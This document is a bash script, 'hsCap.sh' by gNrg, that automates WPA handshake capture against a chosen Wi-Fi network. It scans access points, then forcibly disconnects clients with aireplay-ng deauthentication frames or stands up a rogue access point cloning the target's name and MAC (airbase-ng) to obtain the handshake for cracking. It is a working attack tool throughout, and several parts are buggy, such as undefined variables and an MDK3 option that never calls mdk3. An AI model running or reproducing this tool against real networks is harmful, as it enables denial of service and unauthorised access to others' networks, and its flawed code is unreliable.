#!/bin/bash
# -*- ENCODING: UTF-8 -*-
#
#  gNrg

white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
magenta="\033[0;35m"

# Check if the script is running as root
check_root(){
w=$(whoami)
if [ "$w" == "root" ]; then
sleep 0.5
else 
echo -e "\n [[ ERROR ]] - Must running as root\n"
exit
fi
}

# Stops monitor mode
stop_monitor(){
mon_ifaces=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
let n_ifaces=`echo $mon_ifaces | wc -w`
let i=1
while [ $i -le $n_ifaces ]; do
iface=`echo $mon_ifaces| awk '{print $'$i'}'`
airmon-ng stop $iface > /dev/null 2>&1
let i=$i+1
done
}

# Kill network processes that can interfere
kill_processes(){
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
while [ "$pids" != "" ]; do
killall -q xterm ifconfig dhcpcd dhclient dhclient3 NetworkManager wpa_supplicant udhcpc > /dev/null 2>&1
pids=`ps -A | grep -e xterm -e ifconfig -e dhcpcd -e dhclient -e NetworkManager -e wpa_supplicant -e udhcpc`
done
stop_monitor
mv Networks/"$essid ($split_bssid)"-*.cap ./
rm -fr ./Networks > /dev/null 2>&1
mkdir Networks > /dev/null 2>&1
}

# Select interface to set up monitor mode
select_iface(){
iwconfig --version | grep "Recommend" | awk '{print $1}' > ./Networks/iw.txt
airmon-ng | sed '3d' | awk '{print $2}' | sed '/^$/d' > ./Networks/id.txt
i=1
for j in `cat ./Networks/iw.txt`
do 
      var=`nl ./Networks/id.txt | grep $i | awk '{print $2}'`
      echo $j"       "$var
      let i=i+1
done > ./Networks/iwi.txt
declare -a av_ifaces
  for i in "av_ifaces";
    do
    c=1                
      if [ "$i" == "av_ifaces" ]; then
         while read -r line; do
           av_ifaces[${c}]="$line"
            c=$((c+1)) 
         done < <( cat ./Networks/iwi.txt )
      fi
done

n_ifaces=$(echo ${#av_ifaces[@]})
if [ -z "${n_ifaces}" ];
  then
  echo -e ""$red"[[ ERROR ]] "$green"- Wireless devices not found!\n"
  sleep 2
  exit
else
  echo -e "\n"$green" [[ OK ]] - Wireles devices detected :\n"
  echo -e $magenta" ------------------------------------------------------------"
    for i in ${!av_ifaces[*]}; do
       echo -e $yellow"          $i)        ${av_ifaces[${i}]}      "  
    done
    if [ $n_ifaces -ge 1 ]; then
     echo -e $magenta" ------------------------------------------------------------"$blue""
     echo ""
     read -p " Select device: " opt
       while [[ $opt < 1 ]] || [[ $opt > $n_ifaces ]]; do
         echo -e $red"\n [[ ERROR ]] "$green" - Invalid option\n"
         echo -e $magenta" ------------------------------------------------------------"$blue"\n"
       read -p " Select device: " opt
    done
   fi 
   
iface=$(echo ${av_ifaces[${opt}]}) 
iface_str=`echo $iface | awk '{print $1}'`
fi
}

iface_up(){
ifconfig $iface_str down > /dev/null 2>&1
ifconfig $iface_str up > /dev/null 2>&1
iwconfig $iface_str rate 1M > /dev/null 2>&1
}

monitor_mode(){ 
airmon-ng start $iface_str > /dev/null 2>&1
iface_str=$iface_str"mon"
ifconfig $iface_str > /dev/null 2>&1
echo -e $magenta"\n ------------------------------------------------------------"
echo -e $green"           Activating "$yellow""$iface_str""$green" monitor mode"
echo -e $magenta" ------------------------------------------------------------\n"
sleep 2
}

scan_aps(){
echo -e $green "  Scanning ..."$red" [[ Ctrl + C to stop ]]"
echo -e $magenta" ------------------------------------------------------------\n"
sleep 2
xterm -e airodump-ng --encrypt WPA -w ./Networks/networks $iface_str 
ap_lines=`cat Networks/networks-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
let ap_lines=$ap_lines-1
echo -e "ap_lines = "$ap_lines
head -n $ap_lines Networks/networks-01.csv &> Networks/networks.csv 
tail -n +$ap_lines Networks/networks-01.csv &> Networks/clients.csv 
clear
csv_lines=`wc -l Networks/networks.csv | awk '{print $1}'`
if [ $csv_lines -le 3 ]; then
echo -e $red"\n No APs found! Exiting...\n"
kill_processes
sleep 2
exit
fi
rm -rf Networks/networks.txt> /dev/null 2>&1
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
mac_chars=${#MAC}
if [ $mac_chars -ge 17 ]; then
i=$(($i+1))
if [[ $POWER -lt 0 ]]; then
if [[ $POWER -eq -1 ]]; then
POWER=0
else
POWER=`expr $POWER + 100`
fi
fi
POWER=`echo $POWER | awk '{gsub(/ /,""); print}'`  
ESSID=`expr substr "$ESSID" 2 $IDLENGTH` 
if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ]; then
CHANNEL=0
else
CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'`
fi
if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ]; then
ESSID="(Red Oculta)"
fi
echo -e "$MAC,$CHANNEL,$POWER,$ESSID" >> Networks/networks.txt
fi
done < Networks/networks.csv
sort -t "," -d -k 4 "Networks/networks.txt" > "Networks/wnetworks.txt"
}

# Select access point from list 
select_ap(){
clear
echo -e  $blue"\n  Nº         BSSID       CHANN   PWR      ESSID"
echo -e  $magenta"  ══   ═════════════════ ═════  ═════ ═════════════""$green\n"
i=0
while IFS=, read MAC channel power ESSID; do
i=$(($i+1))
if [ $i -le 9 ]; then
sp1=" "
else
sp1=""
fi
if [[ $channel -le 9 ]]; then
sp2=" "
if [[ $channel -eq 0 ]]; then
channel="-"
fi
else
sp2=""
fi
if [[ "$power" = "" ]]; then
power=0
fi
if [[ $power -le 9 ]]; then
sp4=" "
else
sp4=""
fi
client=`cat Networks/clients.csv | grep $MAC`
if [ "$client" != "" ]; then
client="*" 
sp5=""
else
sp5=" "
fi
ESSIDs[$i]=$ESSID
channels[$i]=$channel
MACs[$i]=$MAC
echo -e " $sp1$i)"$white"$client"$yellow"  $sp5$MAC "$green"  $sp2$channel  "$yellow"  $sp4$power%  "$green" $ESSID "
done < "Networks/wnetworks.txt"
echo
if [ $i -eq 1 ]; then
target=1
else
echo -e $green "("$white"*"$green") Network with clients"$blue""
echo ""
read -p " Select target : " target
fi
while [[ $target -lt 1 ]] || [[ $target -gt $i ]]; do
echo -e $red "\n [[ ERROR ]] "$green"- Invalid option!"$blue"\n"
read -p " Select target : " target
done
essid=${ESSIDs[$target]}
channel=${channels[$target]}
bssid=${MACs[$target]}
split_bssid=`echo $bssid | awk '{gsub(/:/,"-"); print}'`
echo ""
if [ "$essid" = "(Hidden Network)" ]; then
echo -e $red"\n [[ ERROR ]] - You selected a hidden network"
echo -e $yellow""
sleep 1
echo -e " Exiting..."
kill_processes
exit
fi
}

sniff(){
xterm -e airodump-ng --bssid $bssid -c $channel,$channel -w "Networks/$essid ($split_bssid)" $iface_str &
}
sniff_1(){
xterm -e airodump-ng --bssid $bssid -c $channel,$channel -w "Networks/$essid ($split_bssid)" $iface_str &
}

calc(){
num=`ls -1 Networks/"$essid ($split_bssid)"-*.cap | wc -l`
if [ $num -lt 10 ]; then
zero="0"
else
zero=""
fi
}

csv(){
c=1
ls Networks/"$essid ($split_bssid)"-01.csv > /dev/null 2>&1
while [ $? -ne 0 ]; do
echo -e ""$blue".\c"
sleep 0.2
c=$((c+1))
if [ $c -gt 15 ]; then
c=1
fi
ls Networks/"$essid ($split_bssid)"-01.csv > /dev/null 2>&1
done
echo -e "$yellow\n"
}


# Check if MDK3 is installed or try other attacks
check_mdk3(){                                                                       
which mdk3 &> /dev/null                                                            
if [ $? -ne 0 ]; then  
echo -e $red "\n [[ ERROR ]] - mdk3 is not installed!\n"
echo -e $yellow " You can selectone of these attacks:\n"                        
echo -e $blue"\n1) Aireplay-ng\n"
echo "2) Honeypot\n"
echo "3) Honeypot + Aireplay-ng\n"
echo -e $yellow" Select attack : " attack                                                 
case $attack in
1)                                                      
echo -e $yellow "\n You have selected : "$blue"AIREPLAY ATTACK"
echo -e $magenta "--------------------------------------------------"
sleep 2
echo -e $green"\n Capturing data and waiting for Handshake..."
sniff &
csv
handshake_aireplay
;;
2)                                    
echo -e $yellow "\n You have selected : "$blue"HONEYPOT ATTACK"
echo -e $magenta "--------------------------------------------------"
honeypot
honeypot_attack
;;
3)                                   
echo -e $yellow "\n You have selected : "$blue"HONEYPOT + AIREPLAY ATTACK"
echo -e $magenta "--------------------------------------------------"
honeypot
honeypot_attack_0
;;
esac
else
echo -e $green" [[ OK ]] - MDK3 is already installed."  
echo -e $magenta "--------------------------------------------------"
sleep 1 
fi
}

honeypot_attack(){
echo -e $magenta "\n ══════════════════════════════════════════════════"
echo -e $green "              Creating Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $yellow""
airmon-ng start $iface_str > /dev/null 2>&1
sniff_1 &
csv
handshake_honeypot
}

honeypot_attack_0(){
echo -e $magenta "\n ══════════════════════════════════════════════════"
echo -e $green "              Creating Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $yellow""
airmon-ng start $iface_str > /dev/null 2>&1
sniff_1 &
csv
handshake_aireplay
}

honeypot_attack_1(){
echo -e $magenta "\n ══════════════════════════════════════════════════"
echo -e $green "              Creating Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $yellow""
airmon-ng start $iface_str > /dev/null 2>&1
sniff_1 &
csv
handshake_mdk3
}

handshake_aireplay(){
thereis=""
airodump_sniff=`ps -A | grep airodump-ng | grep -v grep`
interval=20
while [ ! "$airodump_sniff" = "" ]; do
calc
v=`cat Networks/"$essid ($split_bssid)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
howmany=`echo $v | wc -w`
if [ "$v" = "" ]; then
calc
echo -e $blue"\r${TAB} Searching clients...\c"
c=1
while [ $c -le 25 ]; do
echo -e " \c"
sleep 0.05
c=$((c+1))
done
else
c=1
while [ $c -le $howmany ]; do
thereis=`echo $v | awk '{print $'$c'}'`
client_mac=`echo -n $thereis | cut -c-8`
echo -en $green"\r Deauthenticating client "$yellow"$thereis... \033[K"
xterm -e aireplay-ng -R --ignore-negative-one -0 5 -a $bssid -c $thereis $iface_str
c=$((c+1))
done
c=$interval
while [ $c -ge 1 ]; do
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $c -eq 1 ]; then
echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
else
if [ $c -lt 10 ]
then
echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
else
echo -e $blue"\r${TAB} Restarting attack in "$green" $c...   $yellow $handshake  \c"$green
fi
fi
if [ "$handshake" = "(1 handshake)" ]; then
echo -e $yellow
break
fi
sleep 1
c=$((c-1))
done
fi
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$handshake" = "(1 handshake)" ]; then
clear
echo -e $magenta "\n\n--------------------------------------------------"
echo -e $white"           "$grenn"HANDSHAKE ACHIEVED"$white" !!!"
echo -e $magenta "--------------------------------------------------"
wpaclean "handshake/$essid ($split_bssid).cap" "Networks/$essid ($split_bssid)-01.cap" > /dev/null 2>&1
kill_processes
handshake_path=`cd ./handshake ; readlink -f "$essid ($split_bssid).cap"`
echo -e $yellow "\n\n You can found the Handshake in handshake folder\n"
echo -e " Handshake path: "$green"$handshake_path"
sleep 1
echo -e $blue "\n Bye Bye...\n"
break
fi
done
}

handshake_mdk3(){
interval=20
thereis=""
airodump_sniff=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airodump_sniff" = "" ]; do
calc
v=`cat Networks/"$essid ($split_bssid)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
howmany=`echo $v | wc -w`
if [ "$v" = "" ]; then
calc
echo -e $blue"\r${TAB} Waiting for clients...\c"
c=1
while [ $c -le 25 ]; do
echo -e " \c"
sleep 0.05
c=$((c+1))
done
else
c=1
while [ $c -le $howmany ]; do
thereis=`echo $v | awk '{print $'$c'}'`
client_mac=`echo -n $thereis | cut -c-8`
echo -en $green"\r Launching MDK3 Attack to "$blue"$essid... \033[K""$green\n"
sleep 1
check_mdk3
c=$((c+1))
done
c=$interval
while [ $c -ge 1 ]; do
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $c -eq 1 ]; then
echo -e $blue"\r${TAB} Restarting attack on  "$green"$c...   $yellow  $handshake \c"$green
else
if [ $c -lt 10 ]; then
echo -e $blue"\r${TAB} Restarting attack on  "$green"$c...   $yellow  $handshake \c"$green
else
echo -e $blue"\r${TAB} Restarting attack on  "$green"$c...   $yellow  $handshake \c"$green
fi
fi
if [ "$handshake" = "(1 handshake)" ]; then
echo -e $yellow
break
fi
sleep 1
c=$((c-1))
done
fi
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$handshake" = "(1 handshake)" ]; then
clear
echo -e $magenta "\n\n--------------------------------------------------"
echo -e $white"           "$grenn"HANDSHAKE ACHIEVED"$white" !!!"
echo -e $magenta "--------------------------------------------------"
wpaclean "handshake/$essid ($split_bssid).cap" "Networks/$essid ($split_bssid)-01.cap" > /dev/null 2>&1
kill_processes
handshake_path=`cd ./handshake ; readlink -f "$essid ($split_bssid).cap"`
echo -e $yellow "\n\n You can found the Handshake in handshake folder\n"
echo -e " Handshake path: "$green"$handshake_path"
sleep 1
echo -e $blue "\n Bye Bye...\n"
break
fi
done
}

handshake_honeypot(){
interval=300
thereis=""
airodump_sniff=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airodump_sniff" = "" ]; do
calc
v=`cat Networks/"$essid ($split_bssid)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
howmany=`echo $v | wc -w`
if [ "$v" = "" ]; then
calc
echo -e $blue"\r${TAB} Waiting for clients...\c"
c=1
while [ $c -le 25 ]; do
echo -e " \c"
sleep 0.05
c=$((c+1))
done
else
c=1
while [ $c -le $howmany ]; do
thereis=`echo $v | awk '{print $'$c'}'`
client_mac=`echo -n $thereis | cut -c-8`
echo -en $green"\r Launching Honeypot... \033[K""$green"
c=$((c+1))
done
c=$interval
while [ $Cc -ge 1 ]; do
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
handshake=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$handshake" = "(1 handshake)" ]; then
echo -e $yellow
break
fi
done
fi
calc
data=`cat ./Networks/"$essid ($split_bssid)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $data -ne 0 ]]; then
hands=`aircrack-ng Networks/"$essid ($split_bssid)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$handshake" = "(1 handshake)" ]; then
clear
echo -e $magenta "\n\n--------------------------------------------------"
echo -e $white"           "$grenn"HANDSHAKE ACHIEVED"$white" !!!"
echo -e $magenta "--------------------------------------------------"
wpaclean "handshake/$essid ($split_bssid).cap" "Networks/$essid ($split_bssid)-01.cap" > /dev/null 2>&1
kill_processes
handshake_path=`cd ./handshake ; readlink -f "$essid ($split_bssid).cap"`
echo -e $yellow "\n\n You can found the Handshake in handshake folder\n"
echo -e " Handshake path: "$green"$handshake_path"
sleep 1
echo -e $blue "\n Bye Bye...\n"
break
fi
done
}

honeypot(){
echo -e ""$yellow"\n Select the encryption type for the Honeypot: \n"
echo -e $blue"   1) WPA-TKIP"
echo -e "   2) WPA-CCMP"
echo -e "   3) WPA2-TKIP"
echo -e "   4) WPA2-CCMP"
echo -e $green ""
read -ep " Select encryption : " enc
case $enc in
1)
xterm -e airbase-ng -c $channel -e $essid -W 1 -z 2 -a $bssid $iface_str &
;;
2)
xterm -e airbase-ng -c $channel -e $essid -W 1 -z 4 -a $bssid $iface_str &
;;
3)
xterm -e airbase-ng -c $channel -e $essid -W 1 -Z 2 -a $bssid $iface_str &
;;
4)
xterm -e airbase-ng -c $channel -e $essid -W 1 -Z 4 -a $bssid $iface_str &
;;
*)
echo -e $red" [[ ERROR ]] - Invalid option!"
honeypot
;;
esac
}

###################################   --   hsCap   --   ###################################
check_root
kill_processes
clear
echo -e $yellow"\n\n +---------------------------------------------+" 
echo -e $yellow" |       "$blue"Welcome a hsCap.sh "$white"v0.1"$blue" by gNrg"$yellow"       |"
echo -e " +---------------------------------------------+\n"
sleep 2
clear
select_iface
iface_up
monitor_mode
scan_aps
select_ap
echo -e $magenta "\n--------------------------------------------------\n"
echo -e $yellow" Attack types. \n\n"
echo -e $blue" 1) Aireplay-ng"
echo " 2) MDK3\n"
echo " 3) Honeypot\n"
echo " 4) Honeypot + Aireplay-ng\n"
echo -e " 5) Honeypot + MDK3\n"$yellow"\n"
read -p " Select attack : " attack

if [ "$attack" = 1 ]; then
echo -e $yellow "\n\n You selected : "$blue"AIREPLAY ATTACK"
echo -e $magenta "--------------------------------------------------\n"
echo -e $green" Capturing data and waiting for the Handshake..."
sniff &
csv
handshake_aireplay
fi
if [ "$attack" = 2 ]; then
echo -e $yellow "\n\n You selected : "$blue"MDK3 ATTACK"
echo -e $magenta "--------------------------------------------------\n"
check_mdk3
echo -e $green" Capturing data and waiting for the Handshake..."
sniff &
csv
handshake_mdk3
fi
if [ "$attack" = 3 ]; then
echo -e $yellow "\n\n You selected : "$blue"HONEY POT ATTACK"
echo -e $magenta "--------------------------------------------------\n"
honeypot
honeypot_attack
fi
if [ "$attack" = 4 ]; then
echo -e $yellow "\n\n You selected : "$blue"HONEYPOT + AIREPLAY ATTACK"
echo -e $magenta "--------------------------------------------------\n"
honeypot
honeypot_attack_0
fi
if [ "$attack" = 5 ]; then
echo -e $yellow "\n\n You selected : "$blue"HONEYPOT + MDK3 ATTACK"
echo -e $magenta "--------------------------------------------------\n"
check_mdk3
honeypot
honeypot_attack_1
fi
